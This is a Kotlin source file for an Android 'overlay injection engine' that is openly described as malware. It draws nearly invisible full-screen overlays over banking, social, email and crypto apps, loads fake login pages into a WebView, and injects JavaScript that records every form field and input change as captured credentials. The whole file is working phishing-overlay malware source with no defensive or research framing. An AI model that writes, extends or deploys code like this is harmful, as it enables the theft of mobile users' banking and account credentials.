// ============================================================
// FILE: android/app/src/main/java/com/xrc/syringe/SyringeEngine.kt
// ============================================================
package com.xrc.syringe

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Build
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView
import com.xrc.core.config.XrcConfig

/**
 * SyringeEngine — overlay injection engine.
 *
 * Draws persistent overlays on top of other apps using
 * SYSTEM_ALERT_WINDOW permission.
 *
 * Capabilities:
 * - Inject phishing overlays over target apps
 * - Capture keystrokes on fake login forms
 * - Dismiss on command or timeout
 * - Multiple overlay templates (banking, social, email, crypto)
 */
class SyringeEngine(
    private val context: Context,
    private val config: XrcConfig
) {
    companion object {
        private const val TAG = "SyringeEngine"
    }

    private val windowManager: WindowManager =
        context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
    private var activeOverlay: View? = null
    private var overlayParams: WindowManager.LayoutParams? = null
    private var capturedInput = mutableMapOf<String, String>()

    /**
     * Inject an overlay over a target app.
     * @param targetPackage Package name of target app
     */
    fun injectOverlay(targetPackage: String): Boolean {
        if (!canDrawOverlays()) return false

        dismissCurrent()

        return try {
            val overlay = buildGenericOverlay(targetPackage)
            val params = getOverlayParams()

            windowManager.addView(overlay, params)
            activeOverlay = overlay
            overlayParams = params

            Log.i(TAG, "Overlay injected over $targetPackage")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Overlay injection failed: ${e.message}")
            false
        }
    }

    /**
     * Show a phishing page overlay over target app.
     */
    fun showPhishingPage(targetPackage: String, template: String): Boolean {
        if (!canDrawOverlays()) return false

        dismissCurrent()

        return try {
            val overlay = buildPhishingOverlay(targetPackage, template)
            val params = getOverlayParams()

            // Make it interactive
            params.flags = params.flags and WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE.inv()

            windowManager.addView(overlay, params)
            activeOverlay = overlay
            overlayParams = params

            Log.i(TAG, "Phishing overlay: $template over $targetPackage")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Phishing overlay failed: ${e.message}")
            false
        }
    }

    /**
     * Capture user input from active phishing overlay.
     */
    fun captureInput(timeoutMs: Long = 30000L): Map<String, String> {
        capturedInput.clear()
        val startTime = System.currentTimeMillis()

        // Wait for input or timeout
        while (capturedInput.isEmpty() && (System.currentTimeMillis() - startTime) < timeoutMs) {
            Thread.sleep(100)
        }

        return capturedInput.toMap()
    }

    /**
     * Hide all active overlays.
     */
    fun hideAll() {
        dismissCurrent()
    }

    /**
     * Dismiss current overlay.
     */
    fun dismissCurrent() {
        try {
            activeOverlay?.let {
                windowManager.removeView(it)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Dismiss overlay: ${e.message}")
        }
        activeOverlay = null
        overlayParams = null
    }

    /**
     * Check if overlay is active.
     */
    fun isActive(): Boolean = activeOverlay != null

    /**
     * Get current overlay info.
     */
    fun getCurrentOverlay(): String? {
        return if (activeOverlay != null) "overlay_active" else null
    }

    /**
     * Check overlay permission.
     */
    fun canDrawOverlays(): Boolean {
        return if (Build.VERSION.SDK_INT >= 23) {
            android.provider.Settings.canDrawOverlays(context)
        } else true
    }

    /**
     * Request overlay permission intent.
     */
    fun requestPermissionIntent(): Intent {
        return Intent(
            android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            android.net.Uri.parse("package:${context.packageName}")
        ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }

    private fun getOverlayParams(): WindowManager.LayoutParams {
        val flags: Int
        val type: Int

        if (Build.VERSION.SDK_INT >= 26) {
            type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        } else {
            type = WindowManager.LayoutParams.TYPE_PHONE
            flags = WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
        }

        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            flags,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            x = 0
            y = 0
            alpha = 0.01f // Nearly invisible by default
        }
    }

    private fun buildGenericOverlay(targetPackage: String): View {
        val layout = FrameLayout(context).apply {
            setBackgroundColor(0x01000000) // Very subtle tint
        }
        return layout
    }

    private fun buildPhishingOverlay(targetPackage: String, template: String): View {
        val webView = WebView(context).apply {
            settings.javaScriptEnabled = true
            settings.domStorageEnabled = true
            settings.loadWithOverviewMode = true
            settings.useWideViewPort = true

            webViewClient = object : WebViewClient() {
                override fun onPageFinished(view: WebView, url: String) {
                    // Inject JavaScript to capture form submissions
                    view.evaluateJavascript("""
                        (function() {
                            // Capture all form submissions
                            document.addEventListener('submit', function(e) {
                                var data = {};
                                var inputs = e.target.querySelectorAll('input, textarea, select');
                                for (var i = 0; i < inputs.length; i++) {
                                    data[inputs[i].name || inputs[i].id || 'field' + i] = inputs[i].value;
                                }
                                window.XRC_CAPTURED = JSON.stringify(data);
                            });

                            // Capture all input changes
                            document.addEventListener('change', function(e) {
                                if (e.target) {
                                    window.XRC_LAST_INPUT = JSON.stringify({
                                        name: e.target.name || e.target.id,
                                        value: e.target.value
                                    });
                                }
                            });
                        })();
                    """, null)
                }
            }

            // Load phishing template
            val htmlContent = PhishingPages.getTemplate(template, targetPackage)
            loadDataWithBaseURL(null, htmlContent, "text/html", "UTF-8", null)
        }

        return webView
    }

    /**
     * Called to store captured phishing input.
     */
    fun storeCapturedInput(fieldName: String, value: String) {
        capturedInput[fieldName] = value
    }
}
